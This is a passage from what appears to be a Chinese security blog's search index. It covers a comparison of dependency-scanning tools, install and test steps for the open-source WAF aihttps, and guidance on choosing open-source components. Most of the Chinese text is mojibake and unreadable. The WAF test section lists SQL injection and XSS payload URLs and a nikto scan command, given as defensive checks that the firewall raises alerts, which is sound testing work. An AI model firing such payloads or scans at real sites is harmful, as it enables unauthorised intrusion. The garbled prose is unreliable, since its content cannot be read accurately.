tomcat-embed-websocket-8.5.6.jar\ncpe:2.3:a:apache:tomcat:8.5.6:::::::*\npkg:maven&#x2F;org.apache.tomcat.embed&#x2F;&#x74;&#111;&#x6d;&#x63;&#97;&#116;&#45;&#101;&#x6d;&#x62;&#x65;&#x64;&#45;&#119;&#101;&#98;&#115;&#111;&#99;&#x6b;&#x65;&#116;&#64;&#x38;&#x2e;&#53;&#46;&#54;\nCRITICAL\n41\nHighest\n27\n\n\n\ncpe:2.3:a:apache_tomcat:apache_tomcat:8.5.6:::::::*\n\n\n\n\n\n\n\nbiz-service-0-1.0.0.jar: xstream-1.4.2.jar\ncpe:2.3:a:xstream_project:xstream:1.4.2:::::::*\npkg:maven&#x2F;com.thoughtworks.xstream&#x2F;&#120;&#115;&#x74;&#114;&#x65;&#97;&#x6d;&#x40;&#49;&#x2e;&#52;&#46;&#x32;\nCRITICAL\n33\nHighest\n21\n\n\ndepemdemcy-trackï¼š78ä¸ªæ¼æ´ï¼šä¸¥é‡16ä¸ªã€é«˜å±31ä¸ªã€ä¸­å±29ä¸ªã€ä½å±2ä¸ª\næµ‹è¯•å¯¹æ¯”\n\n\nå¯¹æ¯”é¡¹\nSCA-Check\nSnky\ndependency-check\n\n\n\ndashboard\nSAASæš‚æ— \næœ‰\næ— ï¼Œå¯ä»¥æŸ¥çœ‹æŠ¥å‘Š\n\n\næ¼æ´æè¿°\nä¸­æ–‡\nè‹±æ–‡\n\n\n\næ¼æ´ç»†èŠ‚\nåŸºæœ¬\nè¯¦ç»†éƒ¨åˆ†åŒ…å«Poc\nåŸºæœ¬NVDæ•°æ®\n\n\næ¼æ´åº“\ncnncd cnvd nvd è‡ªæœ‰\nnvd   è‡ªæœ‰\nnvd\n\n\nç»„ä»¶é£é™©\næœ‰\næ— \næœ‰\n\n\nå®¹å™¨é£é™©\nyaml\næ— \næš‚æ— \n\n\nReferencesSnyk User Documentation - Snyk User Docsç®€ä»‹ | OpenSCA-ç”¨å¼€æºçš„æ–¹å¼åšå¼€æºé£é™©æ²»ç†\n","slug":"OpenSCA","date":"2022-06-22T01:09:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶æˆåˆ†åˆ†æå·¥å…·,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,opensca,æ‚¬é•œå®‰å…¨","author_index":"Moses"},{"id":"80f3746730bf9c3463eb9ffedee128cb","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-AIhttps","content":"ç®€ä»‹aihttpsæ˜¯hihttpsçš„å‡çº§ç‰ˆï¼Œé¦–æ¬¾åŸºäºæœºå™¨å­¦ä¹ ã€è‡ªä¸»å¯¹æŠ—æœªçŸ¥æ”»å‡»çš„é«˜æ€§èƒ½WEBåº”ç”¨é˜²ç«å¢™ï¼ˆ SSL WAFï¼‰ï¼Œæºç å®Œæ•´å¹¶ä¸”å…¼å®¹ModSecurityæ­£åˆ™è§„åˆ™ã€‚ğŸ“¢è¯¥é¡¹ç›®ä¸ªäººå¼€å‘ï¼Œç»´æŠ¤æ€§å·®ï¼Œä¸åˆ—å…¥é€‰å‹åå•ï¼Œå¯ä½œä¸ºäº§å“åŠŸèƒ½å‚è€ƒâ­ï¸DEMOHIHTTPSä¼ä¸šçº§WAFè®¾å¤‡\nåŠŸèƒ½\næ¶æ„Webæ¼æ´æ‰«æ\næ•°æ®åº“SQLæ³¨å…¥\nè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSS)\nCC  &amp; DDOSé˜²æŠ¤\nå¯†ç æš´åŠ›ç ´è§£\nå±é™©æ–‡ä»¶ä¸Šä¼ æ£€æµ‹\néæ³•URL&#x2F;æ–‡ä»¶è®¿é—®\nå…¼å®¹OWASPçš„ModSecurityæ­£åˆ™è§„åˆ™\nepollæ¨¡å‹å•æ ¸æ•°ä¸‡å¹¶å‘è¿æ¥\næ— ç›‘ç£æœºå™¨å­¦ä¹ ã€è‡ªä¸»ç”Ÿæˆå¯¹æŠ—è§„åˆ™\n\nç¼–è¯‘å®‰è£…\nå®‰è£…opensslå’Œlibpcreåº“  CentOS : yum install openssl openssl-devel\nyum install -y pcre pcre-devel \n  Debian&#x2F;Ubuntu:sudo apt-get install openssl libssl-dev\napt-get install libpcre3 libpcre3-dev  \n&#96;&#96;&#96;  \n  2. ç¼–è¯‘\n  è§£å‹åˆ°ä»»æ„ç›®å½•ï¼Œmakeåç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶aihttps\n  [rules]æ˜¯è§„åˆ™ç›®å½•ï¼Œ[train]æ˜¯æ ·æœ¬é‡‡é›†ç›®å½•ï¼Œ[vector]æ˜¯è‡ªç„¶è¯­è¨€word2docå‘é‡ç”Ÿæˆç›®å½•ï¼Œ[src]æ˜¯æºç ç›®å½•ã€‚\n \n  \n  3. è§„åˆ™\n  è§„åˆ™æ”¾åœ¨å’ŒaihttpsåŒä¸€çº§çš„rulesç›®å½•ï¼Œæ›´å¤šè§„åˆ™åœ¨[https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs&#x2F;](https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;owasp-modsecurity-crs&#x2F;) ä¸‹è½½ã€‚\n\n  \n  4. è¿è¡Œ\n  é€šå¸¸aihttpså‰ç«¯ç»‘å®š443ç«¯å£ï¼ˆhttpsï¼‰ï¼Œåç«¯åå‘ä»£ç†80ç«¯å£; é¦–å…ˆä¿è¯WebæœåŠ¡å™¨80ç«¯å£è¿è¡Œæ­£å¸¸ï¼Œ443ç«¯å£æ²¡å ç”¨ã€‚  \n  .&#x2F;aihttpsé»˜è®¤è¯»å–å½“å‰ç›®å½•ä¸‹çš„confg.cfgæ–‡ä»¶ï¼Œ  æˆ–è€….&#x2F;aihttps --config &#x2F;dir&#x2F;config.cfgï¼Œ æ‰“å°å‡ºè§„åˆ™å°±æˆåŠŸã€‚\n  # æµ‹è¯•\n  1.ModSecurityè§„åˆ™æµ‹è¯•\n  rules&#x2F;main.ruleé»˜è®¤åŠ è½½äº†ä¸€æ¡SQLè¯­å¥æ£€æµ‹è§„åˆ™ï¼Œå¯ä»¥è®¿é—®https:&#x2F;&#x2F;serverip&#x2F;select.html?testsql&#x3D;delete * from test\n  æˆ–è€…ç”¨Kaliç³»ç»Ÿçš„æ¼æ´æ‰«æå™¨niktoè¿è¡Œï¼š.&#x2F;nikto  -host serverip -ssl -port 443 -C all\n  å¦‚æœäº§ç”Ÿäº†æŠ¥è­¦è®°å½•ï¼Œåˆ™ä»£è¡¨æ­£å¸¸ï¼\n  \n  \n  2.æœºå™¨å­¦ä¹ &#x2F;è‡ªä¸»å¯¹æŠ—è§„åˆ™æµ‹è¯•æ–¹æ³•ï¼š\n  \n  æœºå™¨å­¦ä¹ æ˜¯æ ¸å¿ƒï¼Œä½†é‡‡é›†æ ·æœ¬éœ€è¦ä¸€å®šæ—¶é—´ï¼Œä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œé»˜è®¤äº†ä¸€æ¡aihttps.htmlå¯¹æŠ—è§„åˆ™ï¼š\n  å¦‚æœè®¿é—®https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;123é‡‡é›†åˆ°çš„æ ·æœ¬å¤§äº99%éƒ½æ˜¯è¿™ç§å½¢æ€ï¼Œé‚£ä¹ˆä¸‹é¢çš„ç½‘å€éƒ½å°†äº§ç”Ÿæ”»å‡»æŠ¥è­¦ï¼š\n  &#96;&#96;&#96;md\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;123&#39; or 1&#x3D;&#39;1\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;1234567890&amp;t&#x3D;123\n  https:&#x2F;&#x2F;serverip&#x2F;aihttps.html?id&#x3D;abc\n  3ã€è¦æµ‹è¯•å¹¶å‘è¿æ¥ï¼Œå¯ä»¥ç”¨wrkç­‰å·¥å…·åœ¨ç›¸åŒç¯å¢ƒæµ‹è¯•æ¯”nginxåå‘ä»£ç†çš„æ€§èƒ½æ›´å¼ºã€‚  wrk -c 25 -t 25 -d 10 https://127.0.0.1/\n\né˜²æŠ¤è§„åˆ™\n\n\nåºå·\nè§„åˆ™åˆ†ç±»åç§°\nè§„åˆ™æ–‡ä»¶å\nçŠ¶æ€\nè®¾ç½®\n\n\n\n1\nSQLæ³¨å…¥\nREQUEST-942-APPLICATION-ATTACK-SQLI.conf\nå·²å¯ç”¨\n\n\n\n2\nXSSæ”»å‡»\nREQUEST-941-APPLICATION-ATTACK-XSS.conf\nå·²å¯ç”¨\n\n\n\n3\né»‘å®¢å·¥å…·æ¶æ„æ‰«æ\nREQUEST-913-SCANNER-DETECTION.conf\nå·²å¯ç”¨\n\n\n\n4\nå¯†ç æš´åŠ›ç ´è§£\nRREQUEST-20-APPLICATION-Brute-PASS.conf\nå·²å¯ç”¨\n\n\n\n5\nCC &amp; DDOSæ”»å‡»\nREQUEST-20-APPLICATION-CC-DDOS.conf\nå·²å¯ç”¨\n\n\n\n6\næ¶æ„æ¼æ´æ¢æµ‹\nREQUEST-102-WWW-RULES.conf\nå·²å¯ç”¨\n\n\n\n7\nè¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤æ¼æ´\nREQUEST-932-APPLICATION-ATTACK-RCE.conf\nå·²å¯ç”¨\n\n\n\n8\næœºå™¨å­¦ä¹ \nREQUEST-888-ML-RULES.conf\nå·²å¯ç”¨\n\n\n\n9\näººå·¥æ™ºèƒ½\nREQUEST-188-APPLICATION-EXPERT.conf\nå·²å¯ç”¨\n\n\n\nè¿è¡Œè®¾ç½® X-Real-IP X-Forwarded-For Ali-CDN-Real-IP \nè¿è¡ŒçŠ¶æ€ \n","slug":"å¼€æºWAF-hihttps","date":"2022-06-20T08:44:21.468Z","categories_index":"å¼€æºWAFäº§å“é€‰å‹","tags_index":"WAF,Nginx,å¼€æºWAFäº§å“é€‰å‹,modsecurity,å®‰å…¨å»ºè®¾","author_index":"Moses"},{"id":"8ee8224489aaec6996f4a5509d1757b4","title":"å¼€æºè½¯ä»¶é€‰å‹åŠå®‰å…¨æŒ‡æ ‡å‚è€ƒ","content":"å¼€æºè½¯ä»¶é€‰å‹åŠå®‰å…¨æŒ‡æ ‡å‚è€ƒå‚è€ƒæ¦‚è¿°å’ŒèƒŒæ™¯å¼€æºè½¯ä»¶ä¾›åº”é“¾é£é™©\nå®‰å…¨æ¼æ´\nå®‰å…¨æ¼æ´åœ¨ç”Ÿæ€ä¸­æ™®éå­˜åœ¨\nè½¯ä»¶ä¾›åº”é“¾ä¸­çš„å®‰å…¨æ¼æ´å½±å“å¹¿æ³›\nå®‰å…¨æ¼æ´å±å®³ä¸¥é‡\n\n\næ¶æ„è½¯ä»¶\næ¶æ„è½¯ä»¶æ„ŸæŸ“æ–¹å¼å¤šæ ·ã€ä¸Šä¸‹æ¸¸æŠ•æ¯’\næ¶æ„è½¯ä»¶å½±å“\n\n\nè½¯ä»¶è®¸å¯è¯\nè½¯ä»¶è®¸å¯è¯è¿åé£é™©\nè½¯ä»¶è®¸å¯è¯ä¿®æ”¹é£é™©\n\n\nè½¯ä»¶ç»´æŠ¤\nå¼€æºè½¯ä»¶å¼€å‘è€…é£é™©\nå¼€æºè½¯ä»¶åœæ­¢ç»´æŠ¤é£é™©\nå¼€æºè½¯ä»¶ç‰ˆæœ¬å‡çº§é£é™©\n\n\n\nå¼€æºç»„ä»¶çš„å®‰å…¨é£é™©è¿‘å¹´æ¥ï¼Œé’ˆå¯¹è½¯ä»¶ä¾›åº”é“¾çš„å®‰å…¨æ”»å‡»äº‹ä»¶ä¸€ç›´å‘ˆå¿«é€Ÿå¢é•¿æ€åŠ¿ï¼Œé€ æˆçš„å±å®³è¶Šæ¥è¶Šä¸¥é‡ï¼Œé˜²èŒƒè½¯ä»¶ä¾›åº”é“¾å®‰å…¨é£é™©ï¼Œå·²ç»è¿«åœ¨çœ‰ç«ï¼›å¼€æºè½¯ä»¶æ¼æ´é¢‘ç°ï¼šæˆªè‡³2020å¹´åº•ï¼ŒCVE&#x2F;NVDã€CNNVDã€CNVDç­‰å…¬å¼€æ¼æ´åº“ä¸­å…±æ”¶å½•å¼€æºè½¯ä»¶ç›¸å…³æ¼æ´41342ä¸ªï¼Œå…¶ä¸­é«˜è¾¾13%ï¼ˆ5366ä¸ªï¼‰ä¸º2020å¹´åº¦æ–°å¢æ¼æ´ï¼›ç ”ç©¶å‘ç°ï¼šè¿‘9æˆè½¯ä»¶é¡¹ç›®å­˜åœ¨å·²çŸ¥å¼€æºè½¯ä»¶æ¼æ´ï¼›å¹³å‡æ¯ä¸ªè½¯ä»¶é¡¹ç›®å­˜åœ¨66ä¸ªå·²çŸ¥å¼€æºè½¯ä»¶æ¼æ´ï¼›å½±å“æœ€å¹¿çš„å¼€æºè½¯ä»¶æ¼æ´å­˜åœ¨äº44.3%çš„è½¯ä»¶é¡¹ç›®ä¸­ï¼›15å¹´å‰å¼€æºè½¯ä»¶æ¼æ´ä»å­˜åœ¨äºå¤šä¸ªè½¯ä»¶é¡¹ç›®ä¸­ã€‚2020å¹´ â€œå¥‡å®‰ä¿¡å¼€æºé¡¹ç›®æ£€æµ‹è®¡åˆ’â€å¯¹1364ä¸ªå¼€æºè½¯ä»¶é¡¹ç›®çš„æºä»£ç å®‰å…¨æ£€æµ‹æ˜¾ç¤ºï¼šå¼€æºè½¯ä»¶é¡¹ç›®æ•´ä½“ç¼ºé™·å¯†åº¦ä¸º14.96ä¸ª&#x2F;åƒè¡Œï¼Œé«˜å±ç¼ºé™·å¯†åº¦ä¸º0.95ä¸ª&#x2F;åƒè¡Œï¼›\n\n\n\nåºå·\nç»„ç»‡ç±»å‹\nç¼ºé™·å¯†åº¦(ä¸ª&#x2F;åƒè¡Œä»£ç )\n\n\n\n1\næ™®é€šè½¯ä»¶å·¥ç¨‹å¸ˆ\n50~250\n\n\n2\næ™®é€šè½¯ä»¶å¼€å‘å…¬å¸\n4-40\n\n\n3\né«˜æ°´å¹³è½¯ä»¶å¼€å‘å…¬å¸\n2~4\n\n\n4\nç¾å›½NASA\n0.1\n\n\n5\nå›½å†…è½¯ä»¶å…¬å¸\n6\n\n\nç»„ä»¶çš„åˆè§„é£é™©åˆè§„é£é™©ä¸»è¦æ¥æºäºä¸¤æ–¹é¢ï¼Œä¸€æ–¹é¢æ˜¯å¼€æºåè®®æ»¥ç”¨å¯¼è‡´çš„å®‰å…¨é£é™©ï¼Œå¦ä¸€æ–¹é¢æ˜¯æ¥ä¹‹ç›‘ç®¡åˆè§„çš„é£é™©ã€‚\n\n\n\n\n\n\n\n\n\n\nã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹ç¬¬ä¸‰åä¸‰æ¡è§„å®šï¼Œå»ºè®¾å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½åº”å½“ç¡®ä¿å…¶å…·æœ‰æ”¯æŒä¸šåŠ¡ç¨³å®šã€æŒç»­è¿è¡Œçš„æ€§èƒ½ï¼Œå¹¶ä¿è¯å®‰å…¨æŠ€æœ¯æªæ–½åŒæ­¥è§„åˆ’ã€åŒæ­¥å»ºè®¾ã€åŒæ­¥ä½¿ç”¨ã€‚è¯¥æ¡è§„å®šï¼Œæ˜ç¡®äº†å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å®‰å…¨å·¥ä½œåº”è¯¥å‰ç§»ï¼Œåœ¨ä¿¡æ¯ç³»ç»Ÿçš„è§„åˆ’é˜¶æ®µå°±åº”è¯¥ä¿è¯å®‰å…¨æŠ€æœ¯æªæ–½çš„ä»‹å…¥ã€‚\nä¿¡æ¯å®‰å…¨æŠ€æœ¯ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åŸºæœ¬è¦æ±‚ã€GBT22239-2019ã€‘ä¸­è¦æ±‚ä¼ä¸šè‡ªè¡Œè½¯ä»¶å¼€å‘åº”åˆ¶å®šä»£ç ç¼–å†™å®‰å…¨è§„èŒƒï¼Œè¦æ±‚å¼€å‘äººå‘˜å‚ç…§è§„èŒƒç¼–å†™ä»£ç ï¼Œåœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­å¯¹å®‰å…¨æ€§è¿›è¡Œæµ‹è¯•ï¼Œåœ¨è½¯ä»¶å®‰è£…å‰å¯¹å¯èƒ½å­˜åœ¨çš„æ¶æ„ä»£ç è¿›è¡Œæ£€æµ‹ï¼›å¯¹å¤–åŒ…è½¯ä»¶å¼€å‘åº”åœ¨è½¯ä»¶äº¤ä»˜å‰æ£€æµ‹å…¶ä¸­å¯èƒ½å­˜åœ¨çš„æ¶æ„ä»£ç ã€‚\n2019å¹´ï¼Œä¸­å›½é“¶ä¿ç›‘ä¼šåŠå…¬å…æ–‡ä»¶ã€é“¶ä¿ç›‘åŠå‘ï¼ˆ2019ï¼‰129å·ã€‘æ–‡ã€Šä¸­å›½é“¶ä¿ç›‘ä¼šåŠå…¬å…å…³äºå¼€å±•é“¶è¡Œä¸šå’Œä¿é™©ä¸šç½‘ç»œå®‰å…¨ä¸“é¡¹æ²»ç†å·¥ä½œçš„é€šçŸ¥ã€‹ä¸­æå‡ºå»ºç«‹æ–°æŠ€æœ¯å¼•å…¥ã€å¼€æºæŠ€æœ¯åº”ç”¨å®‰å…¨è¯„ä¼°ä¸å‡†å…¥æœºåˆ¶ï¼ŒåŠ å¼ºç§‘æŠ€åˆ›æ–°ã€æ–°æŠ€æœ¯åº”ç”¨çš„é£é™©ç›‘æµ‹ä¸å¤„ç½®ã€‚\n2020å¹´ï¼Œä¸­å›½äººæ°‘é“¶è¡ŒåŠå…¬å…æ–‡ä»¶ã€é“¶åŠå‘ï¼ˆ2020ï¼‰45å·ã€‘æ–‡ã€Šä¸­å›½äººæ°‘é“¶è¡ŒåŠå…¬å…å…³äºå¼€å±•é‡‘èç§‘æŠ€åº”ç”¨é£é™©ä¸“é¡¹æ‘¸æ’å·¥ä½œçš„é€šçŸ¥ã€‹ä¸­æå‡ºåº”ä¸å®šæœŸç»„ç»‡é’ˆå¯¹å¼€æºç³»ç»Ÿæˆ–ç»„ä»¶çš„å®‰å…¨æµ‹è¯„ï¼ŒåŠæ—¶è¿›è¡Œæ¼æ´ä¿®å¤å’ŒåŠ å›ºå¤„ç†ã€‚\n\nå¯¹äºå¼€æºåè®®ä¸æ¸…æ¥šçš„çœ‹å®˜å¯ä»¥ç›´æ¥å‚è€ƒä¹Œå…‹å…°ç¨‹åºå‘˜Paul Bagwellç”»çš„å¼€æºåè®®åˆ†æå›¾ï¼Œä»‹ç»æœ€æµè¡Œçš„å…­ç§å¼€æºè®¸å¯è¯â€”-GPLã€BSDã€MITã€Mozillaã€Apacheå’ŒLGPLã€‚\nç»„ä»¶çš„ç¨³å®šæ€§å¼€æºç¤¾åŒºç»´æŠ¤è€…å’Œè´¡çŒ®è€…ä¸ºæˆ‘ä»¬æ‰€æœ‰äººæ„å»ºå·¥å…·ï¼Œä¸ºæˆ‘ä»¬æ—¥å¸¸çš„å¼€å‘æä¾›äº†å¾ˆå¤§çš„å¸®åŠ©ï¼Œä½†å¼€æºç¤¾åŒºçš„è´¡çŒ®è€…è‡ªèº«å´é¢ä¸´è¯¸å¤šé—®é¢˜ï¼Œè¿™äº›é—®é¢˜ä¸€å®šç¨‹åº¦ä¸Šå½±å“äº†å¼€æºè½¯ä»¶çš„å¯æŒç»­å‘å±•ï¼Œå¼€æºé¡¹ç›®çš„å¯æŒç»­æ€§ä¹Ÿä¸€ç›´å­˜åœ¨çŸ›ç›¾ã€‚è¿™ä¸€çŸ›ç›¾å¯¼è‡´å¾ˆå¤šå¼€æºè½¯ä»¶åœ¨æœ€åˆæ›´æ–°è¿­ä»£æ¯”è¾ƒå¿«é€Ÿï¼Œæ–‡æ¡£ä¹¦å†™ä¹Ÿæ¯”è¾ƒåŠæ—¶ï¼Œåé¢å´å¯èƒ½å‡ºç°ä¸€äº›äººå‘˜ç¦»èŒç­‰é—®é¢˜ï¼Œå¯¼è‡´è¯¥å¼€æºäº§å“åç»­çš„æ›´æ–°ä¸åŠæ—¶ï¼Œç”šè‡³ç›´æ¥ä¸­æ–­ï¼Œè¿™æ—¶ä½¿ç”¨è¯¥å¼€æºäº§å“çš„çš„åŒå­¦åœ¨åé¦ˆé—®é¢˜æ—¶å¾€å¾€éœ€è¦å¾ˆé•¿æ—¶é—´æ‰ä¼šå¾—åˆ°ç­”å¤ï¼Œç”šè‡³å¾—ä¸åˆ°ç­”å¤ã€‚\n\n\n\n\n\n\n\n\n\n\né™¤éæ˜¯éå¸¸æˆç†Ÿçš„å¼€æºé¡¹ç›®ï¼Œå¦åˆ™å…¶ç¨³å®šæ€§æ˜¯æœªç»è€ƒéªŒçš„ï¼Œè¿™ä¹Ÿæ˜¯ä½¿ç”¨å¼€æºé¡¹ç›®åœ¨çœŸæ­£è¿›å…¥æŒç»­å•†ä¸šåŒ–æ—¶æ‰€é‡åˆ°çš„æœ€å¤§æŒ‘æˆ˜ï¼å…³äºä¸€ä¸ªé¡¹ç›®æ˜¯å¦â€œæˆç†Ÿâ€ï¼Œè¿™æ˜¯ä¸ªéå¸¸ä¸»è§‚çš„é—®é¢˜ï¼Œå¦‚æœç”¨Githubçš„staræ•°é‡æ¥è¡¡é‡ï¼Œè¦å……åˆ†è€ƒè™‘ä¸­å›½å¼å¼€æºé€šè¿‡è¿è¥äººå¤´æ¥ç‚¹èµçš„æ¨¡å¼ï¼Œå³ä¾¿æœ‰1-2ä¸‡é¢—æ˜Ÿï¼Œä¹Ÿå¹¶ä¸æ„å‘³ç€é¡¹ç›®å·²ç»æˆç†Ÿäº†ã€‚å¦å¤–ï¼Œè¦çœ‹Top-100çš„è´¡çŒ®è€…ï¼Œå¾ˆå¤šæ‰€è°“çš„å¼€æºé¡¹ç›®å‡ ä¹æ‰€æœ‰çš„è´¡çŒ®è€…éƒ½æ˜¯é¡¹ç›®æ‰€åœ¨å…¬å¸çš„å†…éƒ¨å‘˜å·¥ï¼Œè¿™ç§å¼€æºé¡¹ç›®çš„æˆç†Ÿåº¦èƒ½æœ‰å¤šå°‘å‘¢ï¼Ÿ\nåƒMySQLï¼ŒRedisä¹‹ç±»è¿™ä¹ˆç¨³å®šçš„é¡¹ç›®å¹¶ä¸å¸¸è§ï¼Œå³ä¾¿æ˜¯åƒMongoDBè¿™ä¹ˆå®å¤§çš„å¼€æºé¡¹ç›®ï¼Œä¸€æ—¦è¿›å…¥å¤§è§„æ¨¡éƒ¨ç½²åå¯¹äºä»»ä½•ä¸­å°å…¬å¸è€Œè¨€éƒ½æ˜¯å·¨å¤§çš„æŒ‘æˆ˜ï¼Œä¸€æ—¦æ— æ³•å…‹æœï¼Œä¼šæ·±é™·æ³¥æ½­éš¾ä»¥è‡ªæ‹”ã€‚\nå›½å†…å¸‚åœºä¸Šä¸€åº¦ç«çˆ†çš„TFS(Taobao File System&#x3D;æ·˜å®æ–‡ä»¶ç³»ç»Ÿ)ï¼Œæ›¾ç»å—åˆ°å¾ˆå¤šç¨‹åºå‘˜çš„è¿½æ§ï¼Œä½†æ˜¯å¾ˆå°‘æœ‰äººä»”ç»†çš„åˆ†æè¿‡æ·˜å®çš„åº”ç”¨åœºæ™¯å’Œå¯¹è¯¥é¡¹ç›®çš„æ”¯æŒåŠ›åº¦ï¼Œç°åœ¨è¯¥é¡¹ç›®å·²ç»å¯¿ç»ˆæ­£å¯ï¼ˆæ·˜å®å›¢é˜Ÿä¸å†ç»´æŠ¤è¯¥é¡¹ç›®ï¼‰ï¼Œè€Œä¸”æ·˜å®å½“æ—¶è®¾è®¡çš„ç›®çš„æ˜¯æ”¯æŒæµ·é‡å°æ–‡ä»¶ï¼Œè€Œæœ‰å¤šå°‘åˆ›ä¸šé¡¹ç›®æ˜¯ä¸€æ ·çš„ä¸šåŠ¡éœ€æ±‚å‘¢ï¼Ÿå¾ˆå¤šäººç›²ç›®çš„ä¸Šé©¬äº†TFSï¼Œåˆ°å¤´æ¥å‘ç°ç³»ç»Ÿç¨³å®šæ€§å¾ˆå·®è€Œä¸”æœ‰æ— æ•°çš„é—®é¢˜ï¼Œè¿™äº›æ˜¯å°å›¢é˜Ÿã€äºŒæ¬¡å¼€å‘èƒ½åŠ›å¹¶ä¸å¼ºæ‚çš„å›¢é˜Ÿå¯ä»¥æ‰¿å—å¾—äº†çš„å—ï¼Ÿhttps://zhuanlan.zhihu.com/p/361101335\n\nä¸¾ä¾‹ï¼šHystrixå®˜æ–¹å·²ç»å®£å¸ƒåœæ­¢ç»´æŠ¤äº†ï¼Œæœ€æ–°ç‰ˆæœ¬ä¸º2018å¹´11æœˆ17æ—¥å‘å¸ƒçš„1.5.18ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šé¡¹ç›®ä¸­ä½¿ç”¨çš„Hystrixä½œä¸ºé™æµç†”æ–­ç»„ä»¶ï¼ˆç‰ˆæœ¬å¤šä¸º1.5.10ã€1.5.12ã€1.5.18ï¼‰ï¼Œé¢ä¸´æ€§èƒ½ã€å®‰å…¨ã€ç¨³å®šæ€§ç­‰ä¸€äº›åˆ—é—®é¢˜\nä¸åŒé˜¶æ®µçš„é£é™©å¼•å…¥\nå¼€æºè½¯ä»¶é€‰æ‹©openbase\nå¼€æºè½¯ä»¶å®‰å…¨æŒ‡æ ‡Security Metrics - Open Source Security FoundationOpenssfæœ€ä½³å®è·µ\nå¼€æºè½¯ä»¶çš„è¯„ä¼°ç»„ä»¶è¯„ä¼°æ–¹æ³•ä»…é€‚ç”¨äºå¯¹ç»„ä»¶çš„å®‰å…¨é£é™©è¿›è¡Œè¯„ä¼°ï¼Œè¯„ä¼°æ–¹æ³•å¦‚ä¸‹ï¼š\n* ä½¿ç”¨è¯„ä¼°æ£€æµ‹å·¥å…·\n* äººå·¥å¤æ ¸æ’æŸ¥\n* æºä»£ç å®¡è®¡\nç»„ä»¶å®‰å…¨æ£€æµ‹å·¥å…·[[dependency-track]][[dependency-check]]\né—­æºç»„ä»¶ä» ã€Šä¸ªäººä¿¡æ¯å®‰å…¨è§„èŒƒã€‹ æ–°æ ‡å‡†çš„è§„å®šå¯ä»¥çœ‹å‡ºï¼Œå…³äºå¯¹ç¬¬ä¸‰æ–¹æ¥å…¥çš„ç®¡ç†ï¼Œä¸å…±äº«ã€è½¬è®©ã€å§”æ‰˜å¤„ç†ä¸­çš„è§„å®šå’Œè´£ä»»ç›¸ä¼¼ï¼Œä¾‹å¦‚ï¼ŒåŒ…æ‹¬åœ¨äº‹å‰å»ºç«‹ç¬¬ä¸‰æ–¹äº§å“æˆ–æœåŠ¡æ¥å…¥ç®¡ç†æœºåˆ¶ï¼Œåœ¨æ¥å…¥åå¯¹ç¬¬ä¸‰æ–¹äº§å“å’ŒæœåŠ¡è¿›è¡ŒæŒç»­ç›‘ç£ã€é€šè¿‡ç­¾ç½²åˆåŒçº¦æŸåŒæ–¹è´£ä»»ã€éœ€è¦æ˜ç¡®å‘ŠçŸ¥ä¸ªäººä¿¡æ¯ä¸»ä½“æœåŠ¡ç”±ç¬¬ä¸‰æ–¹æä¾›ã€å¯¹è®°å½•è¿›è¡Œä¿å­˜ã€è¦æ±‚ç¬¬ä¸‰æ–¹ç¡®ä¿ä¸ªäººä¿¡æ¯ä¸»ä½“æˆæƒåŒæ„ã€å¯¹ç¬¬ä¸‰æ–¹æ¥å…¥çš„è‡ªåŠ¨åŒ–å·¥å…·æŠ€æœ¯è¿›è¡ŒæŠ€æœ¯æ£€æµ‹ç­‰ç­‰ã€‚æ¶‰åŠå®‰å…¨æ£€æµ‹ï¼Œå¦‚æœæä¾›æºä»£ç ï¼Œå¯ä»¥å¯¹æºä»£ç è¿›è¡Œç™½ç›’å®¡è®¡ï¼Œå‡ºäºä¿å¯†è€ƒè™‘ï¼Œéƒ¨åˆ†å•ä½æ‹’ç»æä¾›æºä»£ç ï¼Œå¯ä»¥é€šè¿‡å‚å•†æä¾›çš„demoï¼Œç»“åˆæ¥å£æ–‡æ¡£ï¼Œç»„ä»¶è®¾è®¡æ–‡æ¡£è¿›è¡Œå®‰å…¨è¯„ä¼°ã€‚\nç»„ä»¶çš„è¿è¥å»ºè®®å¤–éƒ¨ä¾èµ–åº“æ‰«ææ—¶æœºä¸ºå¼•å…¥å‰æ‰«æã€ä¸Šçº¿å‰æ‰«æã€å®šæœŸæ‰«æï¼š\n1ã€å¼•å…¥å‰æ‰«æï¼šåœ¨å¼•å…¥å¤–éƒ¨ä¾èµ–åº“å‰ï¼Œå¯¹æ‰€ç”¨ç‰ˆæœ¬è¿›è¡Œæ‰«æï¼Œä¿è¯å½“å‰ä½¿ç”¨çš„å¤–éƒ¨ä¾èµ–åº“ç‰ˆæœ¬ä¸å­˜åœ¨æ¼æ´ï¼Œå‡å°‘åæœŸå‡çº§ã€ç»´æŠ¤æˆæœ¬ã€‚\n2ã€ä¸Šçº¿å‰æ‰«æï¼šç³»ç»Ÿæµ‹è¯•é˜¶æ®µæˆ–ä¸Šçº¿å‰ï¼Œå¯¹ç³»ç»Ÿæ‰€ä½¿ç”¨çš„å¤–éƒ¨ä¾èµ–åº“è¿›è¡Œä¸€æ¬¡ç»Ÿä¸€æ‰«æï¼Œç¡®ä¿ä¸Šçº¿å‰å¤–éƒ¨ä¾èµ–åº“ä¸å­˜åœ¨å…¬å¼€çš„é«˜å±æ¼æ´ã€‚\n3ã€å®šæœŸæ‰«æï¼šå®šæœŸå¯¹